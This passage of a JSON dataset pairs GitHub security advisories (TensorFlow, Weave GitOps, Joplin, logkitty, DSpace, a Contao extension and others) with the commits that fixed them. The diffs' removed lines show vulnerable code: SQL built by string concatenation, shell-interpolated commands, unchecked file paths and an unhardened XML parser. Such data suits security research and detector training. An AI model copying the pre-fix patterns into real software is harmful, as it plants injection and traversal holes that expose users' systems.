      "files": "{'tensorflow/core/kernels/parameterized_truncated_normal_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8/tensorflow%2Fcore%2Fkernels%2Fparameterized_truncated_normal_op.cc', 'patch': '@@ -627,6 +627,9 @@ class ParameterizedTruncatedNormalOp : public OpKernel {\\n         ctx, TensorShapeUtils::IsVector(shape_tensor.shape()),\\n         errors::InvalidArgument(\"Input shape should be a vector, got shape: \",\\n                                 shape_tensor.shape().DebugString()));\\n+    OP_REQUIRES(ctx, shape_tensor.NumElements() > 0,\\n+                errors::InvalidArgument(\"Shape tensor must not be empty, got \",\\n+                                        shape_tensor.DebugString()));\\n     int32 num_batches = shape_tensor.flat<int32>()(0);\\n \\n     int32 samples_per_batch = 1;'}}",
      "message_norm": "fix breakage in parameterized_truncated_normal_op.cc\n\npiperorigin-revid: 372041718\nchange-id: iff79e77a2bb27032423eefcb84211627b27dfe81",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('372041718', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/parameterized_truncated_normal_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 3428,
      "vuln_id": "GHSA-xggc-qprg-x6mw",
      "cwe_id": "{'CWE-532', 'CWE-209', 'CWE-538', 'CWE-200'}",
      "score": 9.0,
      "chain": "{'https://github.com/weaveworks/weave-gitops/commit/567356f471353fb5c676c77f5abc2a04631d50ca'}",
      "dataset": "osv",
      "summary": "Weave GitOps leaked cluster credentials into logs on connection errors ### Impact\nA vulnerability in the logging of Weave GitOps could allow an authenticated remote attacker to view sensitive cluster configurations, aka KubeConfg, of registered Kubernetes clusters, including the service account tokens in plain text from Weave GitOps's pod logs on the management cluster. An unauthorized remote attacker can also view these sensitive configurations from external log storage if enabled by the management cluster.\n\nThis vulnerability is due to the client factory dumping cluster configurations and their service account tokens when the cluster manager tries to connect to an API server of a registered cluster, and a connection error occurs. An attacker could exploit this vulnerability by either accessing logs of a pod of Weave GitOps, or from external log storage and obtaining all cluster configurations of registered clusters.\n\nA successful exploit could allow the attacker to use those cluster configurations to manage the registered Kubernetes clusters.\n\n### Patches\nThis vulnerability has been fixed by commit 567356f471353fb5c676c77f5abc2a04631d50ca. Users should upgrade to Weave GitOps core version >= v0.8.1-rc.6 released on 31/05/2022.\n\n### Workarounds\nThere is no workaround for this vulnerability.\n\n### References\nDisclosed by Stefan Prodan, Principal Engineer, Weaveworks.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Weave GitOps repository](https://github.com/weaveworks/weave-gitops)\n* Email us at [support@weave.works](mailto:support@weave.works)",
      "published_date": "2022-06-23",
      "chain_len": 1,
      "project": "https://github.com/weaveworks/weave-gitops",
      "commit_href": "https://github.com/weaveworks/weave-gitops/commit/567356f471353fb5c676c77f5abc2a04631d50ca",
      "commit_sha": "567356f471353fb5c676c77f5abc2a04631d50ca",
      "patch": "SINGLE",
      "chain_ord": "['567356f471353fb5c676c77f5abc2a04631d50ca']",
      "before_first_fix_commit": "{'a80bb361901d2e0e8f0e675303dfc3cbfcc9ab92'}",
      "last_fix_commit": "567356f471353fb5c676c77f5abc2a04631d50ca",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/28/2022, 12:43:50",
      "message": "Fix logging on cluster connection error\nRemove the client config from the error log since the wrapped error already contains the cluster name for which the connection couldn't be established.\n\nSigned-off-by: Stefan Prodan <stefan.prodan@gmail.com>",
      "author": "Stefan Prodan",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'core/clustersmngr/factory.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/weaveworks/weave-gitops/raw/567356f471353fb5c676c77f5abc2a04631d50ca/core%2Fclustersmngr%2Ffactory.go', 'patch': '@@ -131,7 +131,7 @@ func (cf *clientsFactory) watchNamespaces(ctx context.Context) {\\n func (cf *clientsFactory) UpdateNamespaces(ctx context.Context) error {\\n \\tclients, err := clientsForClusters(cf.clusters.Get())\\n \\tif err != nil {\\n-\\t\\tcf.log.Error(err, \"failed to create clients for\", \"clusters\", cf.clusters.Get())\\n+\\t\\tcf.log.Error(err, \"failed to create client\")\\n \\t\\treturn err\\n \\t}'}}",
      "message_norm": "fix logging on cluster connection error\nremove the client config from the error log since the wrapped error already contains the cluster name for which the connection couldn't be established.\n\nsigned-off-by: stefan prodan <stefan.prodan@gmail.com>",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('error', 'FLAW', ''), ('remove', 'ACTION', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('stefan.prodan@gmail.com', 'EMAIL', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['core/clustersmngr/factory.go'])",
      "num_files": 1.0
    },
    {
      "index": 1553,
      "vuln_id": "GHSA-cgjv-rghq-qhgp",
      "cwe_id": "{'CWE-22'}",
      "score": 8.6,
      "chain": "{'https://github.com/AlgoRythm-Dylan/httpserv/commit/bcfe9d4316c2b59aab3a64a38905376026888735'}",
      "dataset": "osv",
      "summary": "Path Traversal in algo-httpserv Versions of `algo-httpserv` prior to 1.1.2 are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths. \n\n\n## Recommendation\n\nUpgrade to version 1.1.2 or later.",
      "published_date": "2019-09-11",
      "chain_len": 1,
      "project": "https://github.com/AlgoRythm-Dylan/httpserv",
      "commit_href": "https://github.com/AlgoRythm-Dylan/httpserv/commit/bcfe9d4316c2b59aab3a64a38905376026888735",
      "commit_sha": "bcfe9d4316c2b59aab3a64a38905376026888735",
      "patch": "SINGLE",
      "chain_ord": "['bcfe9d4316c2b59aab3a64a38905376026888735']",
      "before_first_fix_commit": "{'7763b4f9b0b9e1873ae0cdfef582c786ee96f091'}",
      "last_fix_commit": "bcfe9d4316c2b59aab3a64a38905376026888735",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/17/2019, 22:10:35",
      "message": "Fixed path vulnerability",
      "author": "AlgoRythm-Dylan",
      "comments": null,
      "stats": "{'additions': 7, 'deletions': 2, 'total': 9}",
      "files": "{'httpserv.js': {'additions': 7, 'deletions': 2, 'changes': 9, 'status': 'modified', 'raw_url': 'https://github.com/AlgoRythm-Dylan/httpserv/raw/bcfe9d4316c2b59aab3a64a38905376026888735/httpserv.js', 'patch': '@@ -1,6 +1,7 @@\\n // Stream-based KISS HTTP(S) server\\n \\n const url = require(\"url\");\\n+const pathlib = require(\"path\")\\n const fs = require(\"fs\");\\n \\n // A small database of MIME associations\\n@@ -32,7 +33,7 @@ var MIMES = {\\n     \".zip\": \"application/zip\"\\n }\\n \\n-var servePath = \"serve\";\\n+var servePath = \"serve/\";\\n function doStream(request, response, filePath, stats, MIME){\\n     let responseOptions = {};\\n     let streamOptions = {};\\n@@ -82,7 +83,11 @@ module.exports.serve = function(request, response){\\n         MIME = MIMES[fileType];\\n     }\\n     // Serve the actual file\\n-    var filePath = servePath + path;\\n+    var filePath = pathlib.join(servePath, path);\\n+    if(filePath.indexOf(servePath) !== 0){\\n+        response.end();\\n+        return;\\n+    }\\n     let handler = handlers[path];\\n     if(handler !== undefined){\\n         if(handler.requestTypes === null || handler.requestTypes.indexOf(request.method) != -1){'}}",
      "message_norm": "fixed path vulnerability",
      "language": "en",
      "entities": "[('fixed', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['httpserv.js'])",
      "num_files": 1.0
    },
    {
      "index": 2674,
      "vuln_id": "GHSA-q26w-wjj2-22vv",
      "cwe_id": "{'CWE-79'}",
      "score": 6.1,
      "chain": "{'https://github.com/laurent22/joplin/commit/fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13'}",
      "dataset": "osv",
      "summary": "Cross-site scripting in Joplin Joplin allows XSS via a LINK element in a note.",
      "published_date": "2021-05-10",
      "chain_len": 1,
      "project": "https://github.com/laurent22/joplin",
      "commit_href": "https://github.com/laurent22/joplin/commit/fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13",
      "commit_sha": "fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13",
      "patch": "SINGLE",
      "chain_ord": "['fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13']",
      "before_first_fix_commit": "{'4a184721e4e4aa00a39d508cdc1a3ae660d3610e'}",
      "last_fix_commit": "fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13",
      "chain_ord_pos": 1.0,
      "commit_datetime": "10/29/2020, 16:19:56",
      "message": "All: Security: Remove \"link\" and \"meta\" tags from notes to prevent XSS",
      "author": "Laurent Cozic",
      "comments": null,
      "stats": "{'additions': 10, 'deletions': 5, 'total': 15}",
      "files": "{'ReactNativeClient/lib/joplin-renderer/htmlUtils.js': {'additions': 10, 'deletions': 5, 'changes': 15, 'status': 'modified', 'raw_url': 'https://github.com/laurent22/joplin/raw/fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13/ReactNativeClient%2Flib%2Fjoplin-renderer%2FhtmlUtils.js', 'patch': '@@ -87,11 +87,16 @@ class HtmlUtils {\\n \\t\\t\\treturn tagStack[tagStack.length - 1];\\n \\t\\t};\\n \\n-\\t\\t// The BASE tag allows changing the base URL from which files are loaded, and\\n-\\t\\t// that can break several plugins, such as Katex (which needs to load CSS\\n-\\t\\t// files using a relative URL). For that reason it is disabled.\\n-\\t\\t// More info: https://github.com/laurent22/joplin/issues/3021\\n-\\t\\tconst disallowedTags = [\\'script\\', \\'iframe\\', \\'frameset\\', \\'frame\\', \\'object\\', \\'base\\', \\'embed\\'];\\n+\\t\\t// The BASE tag allows changing the base URL from which files are\\n+\\t\\t// loaded, and that can break several plugins, such as Katex (which\\n+\\t\\t// needs to load CSS files using a relative URL). For that reason\\n+\\t\\t// it is disabled. More info:\\n+\\t\\t// https://github.com/laurent22/joplin/issues/3021\\n+\\t\\t//\\n+\\t\\t// \"link\" can be used to escape the parser and inject JavaScript.\\n+\\t\\t// Adding \"meta\" too for the same reason as it shouldn\\'t be used in\\n+\\t\\t// notes anyway.\\n+\\t\\tconst disallowedTags = [\\'script\\', \\'iframe\\', \\'frameset\\', \\'frame\\', \\'object\\', \\'base\\', \\'embed\\', \\'link\\', \\'meta\\'];\\n \\n \\t\\tconst parser = new htmlparser2.Parser({'}}",
      "message_norm": "all: security: remove \"link\" and \"meta\" tags from notes to prevent xss",
      "language": "en",
      "entities": "[('security', 'SECWORD', ''), ('remove', 'ACTION', ''), ('prevent', 'ACTION', ''), ('xss', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['ReactNativeClient/lib/joplin-renderer/htmlUtils.js'])",
      "num_files": 1.0
    },
    {
      "index": 3081,
      "vuln_id": "GHSA-v8v8-6859-qxm4",
      "cwe_id": "{'CWE-94'}",
      "score": 0.0,
      "chain": "{'https://github.com/zamotany/logkitty/commit/ef2f673e25c629544dd3de6429999318447dd6bf'}",
      "dataset": "osv",
      "summary": "Arbitrary shell command execution in logkitty Lack of output sanitization allowed an attack to execute arbitrary shell commands via the logkitty npm package before version 0.7.1.",
      "published_date": "2020-06-05",
      "chain_len": 1,
      "project": "https://github.com/zamotany/logkitty",
      "commit_href": "https://github.com/zamotany/logkitty/commit/ef2f673e25c629544dd3de6429999318447dd6bf",
      "commit_sha": "ef2f673e25c629544dd3de6429999318447dd6bf",
      "patch": "SINGLE",
      "chain_ord": "['ef2f673e25c629544dd3de6429999318447dd6bf']",
      "before_first_fix_commit": "{'e1e229687472d8c9266d17f2969ff7431a78db86'}",
      "last_fix_commit": "ef2f673e25c629544dd3de6429999318447dd6bf",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/07/2020, 09:35:09",
      "message": "huntr - Command Injection Fix (#18)\n\nCo-authored-by: jammy <jammy@loves.shib.es>\r\nCo-authored-by: Pawe\u0142 Trys\u0142a <zamotany@users.noreply.github.com>",
      "author": "huntr-helper",
      "comments": null,
      "stats": "{'additions': 9, 'deletions': 6, 'total': 15}",
      "files": "{'src/android/adb.ts': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https://github.com/zamotany/logkitty/raw/ef2f673e25c629544dd3de6429999318447dd6bf/src%2Fandroid%2Fadb.ts', 'patch': \"@@ -1,4 +1,4 @@\\n-import { spawn, execSync, ChildProcess } from 'child_process';\\n+import { spawn, execFileSync, ChildProcess } from 'child_process';\\n import path from 'path';\\n import {\\n   CodeError,\\n@@ -25,7 +25,7 @@ export function getAdbPath(customPath?: string): string {\\n \\n export function spawnLogcatProcess(adbPath: string): ChildProcess {\\n   try {\\n-    execSync(`${adbPath} logcat -c`);\\n+    execFileSync(adbPath, ['logcat', '-c']);\\n   } catch (error) {\\n     throw new CodeError(\\n       ERR_ANDROID_CANNOT_CLEAN_LOGCAT_BUFFER,\\n@@ -49,11 +49,14 @@ export function getApplicationPid(\\n   applicationId: string,\\n   adbPath?: string\\n ): number {\\n-  let output: Buffer | undefined;\\n+  let output: Buffer | String | undefined;\\n   try {\\n-    output = execSync(\\n-      `'${getAdbPath(adbPath)}' shell pidof -s ${applicationId}`\\n-    );\\n+    output = execFileSync(getAdbPath(adbPath), [\\n+      'shell',\\n+      'pidof',\\n+      '-s',\\n+      applicationId,\\n+    ]);\\n   } catch (error) {\\n     throw new CodeError(\\n       ERR_ANDROID_CANNOT_GET_APP_PID,\"}}",
      "message_norm": "huntr - command injection fix (#18)\n\nco-authored-by: jammy <jammy@loves.shib.es>\r\nco-authored-by: pawe\u0142 trys\u0142a <zamotany@users.noreply.github.com>",
      "language": "en",
      "entities": "[('command injection', 'SECWORD', ''), ('#18', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/android/adb.ts'])",
      "num_files": 1.0
    },
    {
      "index": 517,
      "vuln_id": "GHSA-4wm8-c2vv-xrpq",
      "cwe_id": "{'CWE-79'}",
      "score": 7.1,
      "chain": "{'https://github.com/DSpace/DSpace/commit/28eb8158210d41168a62ed5f9e044f754513bc37', 'https://github.com/DSpace/DSpace/commit/f7758457b7ec3489d525e39aa753cc70809d9ad9'}",
      "dataset": "osv",
      "summary": "JSPUI Possible Cross Site Scripting in \"Request a Copy\" Feature ### Impact\nThe JSPUI \"Request a Copy\" feature does not properly escape values submitted and stored from the \"Request a Copy\" form.  This means that item requests could be vulnerable to XSS attacks.  This vulnerability only impacts the JSPUI.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n\n_DSpace 6.x:_ \n* Fixed in 6.4 via commit: https://github.com/DSpace/DSpace/commit/503a6af57fd720c37b0d86c34de63baa5dd85819\n* 6.x patch file: https://github.com/DSpace/DSpace/commit/503a6af57fd720c37b0d86c34de63baa5dd85819.patch (may be applied manually if an immediate upgrade to 6.4 is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.11 via commit: https://github.com/DSpace/DSpace/commit/28eb8158210d41168a62ed5f9e044f754513bc37\n* 5.x patch file: https://github.com/DSpace/DSpace/commit/28eb8158210d41168a62ed5f9e044f754513bc37.patch (may be applied manually if an immediate upgrade to 5.11 or 6.4 is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs / configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\nAs a workaround, you can temporarily disable the \"Request a Copy\" feature by either commenting out the below configuration (or setting its value to empty):\n```\n# Comment out this default value\n# request.item.type = all\n```\nOnce your JSPUI site is patched, you can re-enable this setting. See https://wiki.lyrasis.org/display/DSDOC6x/Request+a+Copy for more information on this setting.\n\n### References\nDiscovered & reported by Andrea Bollini of 4Science\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org",
      "published_date": "2022-08-06",
      "chain_len": 2,
      "project": "https://github.com/DSpace/DSpace",
      "commit_href": "https://github.com/DSpace/DSpace/commit/f7758457b7ec3489d525e39aa753cc70809d9ad9",
      "commit_sha": "f7758457b7ec3489d525e39aa753cc70809d9ad9",
      "patch": "MULTI",
      "chain_ord": "['f7758457b7ec3489d525e39aa753cc70809d9ad9', '28eb8158210d41168a62ed5f9e044f754513bc37']",
      "before_first_fix_commit": "{'56e76049185bbd87c994128a9d77735ad7af0199'}",
      "last_fix_commit": "28eb8158210d41168a62ed5f9e044f754513bc37",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/08/2020, 00:48:56",
      "message": "[DS-4133] Improve URL handling in Controlled Vocab JSPUI servlet",
      "author": "Kim Shepherd",
      "comments": null,
      "stats": "{'additions': 10, 'deletions': 2, 'total': 12}",
      "files": "{'dspace-jspui/src/main/java/org/dspace/app/webui/servlet/ControlledVocabularyServlet.java': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https://github.com/DSpace/DSpace/raw/f7758457b7ec3489d525e39aa753cc70809d9ad9/dspace-jspui%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fwebui%2Fservlet%2FControlledVocabularyServlet.java', 'patch': '@@ -14,6 +14,7 @@\\n import javax.servlet.http.HttpServletRequest;\\n import javax.servlet.http.HttpServletResponse;\\n \\n+import org.apache.log4j.Logger;\\n import org.dspace.authorize.AuthorizeException;\\n import org.dspace.core.Context;\\n \\n@@ -25,8 +26,8 @@\\n  */\\n public class ControlledVocabularyServlet extends DSpaceServlet\\n {\\n-    // private static Logger log =\\n-    // Logger.getLogger(ControlledVocabularyServlet.class);\\n+    private static Logger log =\\n+    Logger.getLogger(ControlledVocabularyServlet.class);\\n \\n     protected void doDSGet(Context context, HttpServletRequest request,\\n             HttpServletResponse response) throws ServletException, IOException,\\n@@ -37,6 +38,13 @@ protected void doDSGet(Context context, HttpServletRequest request,\\n         String filter = \"\";\\n         String callerUrl = request.getParameter(\"callerUrl\");\\n \\n+        // callerUrl must starts with URL outside DSpace request context path\\n+        if(!callerUrl.startsWith(request.getContextPath())) {\\n+            log.error(\"Controlled vocabulary caller URL would result in redirect outside DSpace web app: \" + callerUrl + \". Rejecting request with 400 Bad Request.\");\\n+            response.sendError(400, \"The caller URL must be within the DSpace base URL of \" + request.getContextPath());\\n+            return;\\n+        }\\n+\\n         if (request.getParameter(\"ID\") != null)\\n         {\\n             ID = request.getParameter(\"ID\");'}}",
      "message_norm": "[ds-4133] improve url handling in controlled vocab jspui servlet",
      "language": "en",
      "entities": "[('improve', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['dspace-jspui/src/main/java/org/dspace/app/webui/servlet/ControlledVocabularyServlet.java'])",
      "num_files": 1.0
    },
    {
      "index": 3041,
      "vuln_id": "GHSA-v3mr-gp7j-pw5w",
      "cwe_id": "{'CWE-89'}",
      "score": 0.0,
      "chain": "{'https://github.com/terminal42/contao-tablelookupwizard/commit/a5e723a28f110b7df8ffc4175cef9b061d3cc717'}",
      "dataset": "osv",
      "summary": "Possible SQL injection in tablelookupwizard Contao Extension ### Impact\nThe currently selected widget values were not correctly sanitized before passing it to the database, leading to an SQL injection possibility.\n\n### Patches\nThe issue has been patched in `tablelookupwizard` version 3.3.5 and version 4.0.0.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/terminal42/contao-tablelookupwizard\n* Email us at [info@terminal42.ch](mailto:info@terminal42.ch)",
      "published_date": "2022-02-10",
      "chain_len": 1,
      "project": "https://github.com/terminal42/contao-tablelookupwizard",
      "commit_href": "https://github.com/terminal42/contao-tablelookupwizard/commit/a5e723a28f110b7df8ffc4175cef9b061d3cc717",
      "commit_sha": "a5e723a28f110b7df8ffc4175cef9b061d3cc717",
      "patch": "SINGLE",
      "chain_ord": "['a5e723a28f110b7df8ffc4175cef9b061d3cc717']",
      "before_first_fix_commit": "{'ae6c82f10b0f1e87226079ebaa78ac630b05279a'}",
      "last_fix_commit": "a5e723a28f110b7df8ffc4175cef9b061d3cc717",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/04/2022, 07:13:15",
      "message": "Fixed SQL query for current field value",
      "author": "Andreas Schempp",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 2, 'total': 4}",
      "files": "{'TableLookupWizard.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/terminal42/contao-tablelookupwizard/raw/a5e723a28f110b7df8ffc4175cef9b061d3cc717/TableLookupWizard.php', 'patch': '@@ -407,9 +407,9 @@ protected function prepareWhere()\\n \\n         // Filter those that have already been chosen\\n         if (\\'checkbox\\' === $this->fieldType && \\\\is_array($varData) && !empty($varData)) {\\n-            $this->arrWhereProcedure[] = $this->foreignTable.\\'.id NOT IN (\\'.implode(\\',\\', $varData).\\')\\';\\n+            $this->arrWhereProcedure[] = $this->foreignTable.\\'.id NOT IN (\\'.implode(\\',\\', array_map(\\'intval\\', $varData)).\\')\\';\\n         } elseif (\\'radio\\' === $this->fieldType && \\'\\' !== $varData) {\\n-            $this->arrWhereProcedure[] = \"{$this->foreignTable}.id!=\\'$varData\\'\";\\n+            $this->arrWhereProcedure[] = $this->foreignTable.\\'.id!=\\'.(int) $varData;\\n         }\\n \\n         // If custom WHERE is set, add it to the statement'}}",
      "message_norm": "fixed sql query for current field value",
      "language": "ca",
      "entities": "[('fixed', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['TableLookupWizard.php'])",
      "num_files": 1.0
    },
    {
      "index": 757,
      "vuln_id": "GHSA-662x-fhqg-9p8v",
      "cwe_id": "{'CWE-400'}",
      "score": 7.5,
      "chain": "{'https://github.com/faisalman/ua-parser-js/commit/233d3bae22a795153a7e6638887ce159c63e557d'}",
      "dataset": "osv",
      "summary": "Regular Expression Denial of Service in ua-parser-js The package ua-parser-js before 0.7.22 are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex for Redmi Phones and Mi Pad Tablets UA.",
      "published_date": "2021-05-07",
      "chain_len": 1,
      "project": "https://github.com/faisalman/ua-parser-js",
      "commit_href": "https://github.com/faisalman/ua-parser-js/commit/233d3bae22a795153a7e6638887ce159c63e557d",
      "commit_sha": "233d3bae22a795153a7e6638887ce159c63e557d",
      "patch": "SINGLE",
      "chain_ord": "['233d3bae22a795153a7e6638887ce159c63e557d']",
      "before_first_fix_commit": "{'5230745280ba8aee775b0f5d2c8a2332f8ef2c4e'}",
      "last_fix_commit": "233d3bae22a795153a7e6638887ce159c63e557d",
      "chain_ord_pos": 1.0,
      "commit_datetime": "09/12/2020, 08:47:15",
      "message": "Fix potential ReDoS vulnerability",
      "author": "Faisal Salman",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 2, 'total': 4}",
      "files": "{'src/ua-parser.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/faisalman/ua-parser-js/raw/233d3bae22a795153a7e6638887ce159c63e557d/src%2Fua-parser.js', 'patch': \"@@ -585,9 +585,9 @@\\n             /android.+(hm[\\\\s\\\\-_]*note?[\\\\s_]*(?:\\\\d\\\\w)?)\\\\s+build/i,               // Xiaomi Hongmi\\n             /android.+(mi[\\\\s\\\\-_]*(?:a\\\\d|one|one[\\\\s_]plus|note lte)?[\\\\s_]*(?:\\\\d?\\\\w?)[\\\\s_]*(?:plus)?)\\\\s+build/i,    \\n                                                                                 // Xiaomi Mi\\n-            /android.+(redmi[\\\\s\\\\-_]*(?:note)?(?:[\\\\s_]*[\\\\w\\\\s]+))\\\\s+build/i       // Redmi Phones\\n+            /android.+(redmi[\\\\s\\\\-_]*(?:note)?(?:[\\\\s_]?[\\\\w\\\\s]+))\\\\s+build/i       // Redmi Phones\\n             ], [[MODEL, /_/g, ' '], [VENDOR, 'Xiaomi'], [TYPE, MOBILE]], [\\n-            /android.+(mi[\\\\s\\\\-_]*(?:pad)(?:[\\\\s_]*[\\\\w\\\\s]+))\\\\s+build/i            // Mi Pad tablets\\n+            /android.+(mi[\\\\s\\\\-_]*(?:pad)(?:[\\\\s_]?[\\\\w\\\\s]+))\\\\s+build/i            // Mi Pad tablets\\n             ],[[MODEL, /_/g, ' '], [VENDOR, 'Xiaomi'], [TYPE, TABLET]], [\\n             /android.+;\\\\s(m[1-5]\\\\snote)\\\\sbuild/i                                // Meizu\\n             ], [MODEL, [VENDOR, 'Meizu'], [TYPE, MOBILE]], [\"}}",
      "message_norm": "fix potential redos vulnerability",
      "language": "ca",
      "entities": "[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/ua-parser.js'])",
      "num_files": 1.0
    },
    {
      "index": 2901,
      "vuln_id": "GHSA-r8j4-96mx-rjcc",
      "cwe_id": "{'CWE-611'}",
      "score": 5.5,
      "chain": "{'https://github.com/skylot/jadx/commit/d22db30166e7cb369d72be41382bb63ac8b81c52'}",
      "dataset": "osv",
      "summary": "Improper Restriction of XML External Entity Reference in skylot/jadx skylot/jadx prior to 1.3.2 is vulnerable to Improper Restriction of XML External Entities when a user is tricked into exporting a malicious APK file (via the -e option) containing a crafted AndroidManifest.xml / strings.xml to gradle, leading to possible local file disclosure.",
      "published_date": "2022-01-21",
      "chain_len": 1,
      "project": "https://github.com/skylot/jadx",
      "commit_href": "https://github.com/skylot/jadx/commit/d22db30166e7cb369d72be41382bb63ac8b81c52",
      "commit_sha": "d22db30166e7cb369d72be41382bb63ac8b81c52",
      "patch": "SINGLE",
      "chain_ord": "['d22db30166e7cb369d72be41382bb63ac8b81c52']",
      "before_first_fix_commit": "{'6db61e7a5908db0138a3a15d42c0a46ae787c72c'}",
      "last_fix_commit": "d22db30166e7cb369d72be41382bb63ac8b81c52",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/20/2022, 11:17:12",
      "message": "fix: use secure xml parser for process manifest",
      "author": "Skylot",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 2, 'total': 4}",
      "files": "{'jadx-core/src/main/java/jadx/core/export/ExportGradleProject.java': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/skylot/jadx/raw/d22db30166e7cb369d72be41382bb63ac8b81c52/jadx-core%2Fsrc%2Fmain%2Fjava%2Fjadx%2Fcore%2Fexport%2FExportGradleProject.java', 'patch': '@@ -8,7 +8,6 @@\\n import java.util.Set;\\n \\n import javax.xml.parsers.DocumentBuilder;\\n-import javax.xml.parsers.DocumentBuilderFactory;\\n \\n import org.slf4j.Logger;\\n import org.slf4j.LoggerFactory;\\n@@ -24,6 +23,7 @@\\n import jadx.core.utils.exceptions.JadxRuntimeException;\\n import jadx.core.utils.files.FileUtils;\\n import jadx.core.xmlgen.ResContainer;\\n+import jadx.core.xmlgen.XmlSecurity;\\n \\n public class ExportGradleProject {\\n \\n@@ -139,7 +139,7 @@ private ApplicationParams getApplicationParams(Document androidManifest, Documen\\n \\n \\tprivate Document parseXml(String xmlContent) {\\n \\t\\ttry {\\n-\\t\\t\\tDocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\\n+\\t\\t\\tDocumentBuilder builder = XmlSecurity.getSecureDbf().newDocumentBuilder();\\n \\t\\t\\tDocument document = builder.parse(new InputSource(new StringReader(xmlContent)));\\n \\n \\t\\t\\tdocument.getDocumentElement().normalize();'}}",
      "message_norm": "fix: use secure xml parser for process manifest",
      "language": "ca",
      "entities": "[('fix', 'ACTION', ''), ('secure', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['jadx-core/src/main/java/jadx/core/export/ExportGradleProject.java'])",
      "num_files": 1.0
    },
    {
      "index": 2823,
      "vuln_id": "GHSA-qw5h-7f53-xrp6",
      "cwe_id": "{'CWE-674'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/e07e1c3d26492c06f078c7e5bf2d138043e199c1'}",
      "dataset": "osv",
      "summary": "Stack overflow in `ParseAttrValue` with nested tensors ### Impact\nThe implementation of [`ParseAttrValue`](https://github.com/tensorflow/tensorflow/blob/c22d88d6ff33031aa113e48aa3fc9aa74ed79595/tensorflow/core/framework/attr_value_util.cc#L397-L453) can be tricked into stack overflow due to recursion by giving in a specially crafted input.\n\n### Patches\nWe have patched the issue in GitHub commit [e07e1c3d26492c06f078c7e5bf2d138043e199c1](https://github.com/tensorflow/tensorflow/commit/e07e1c3d26492c06f078c7e5bf2d138043e199c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
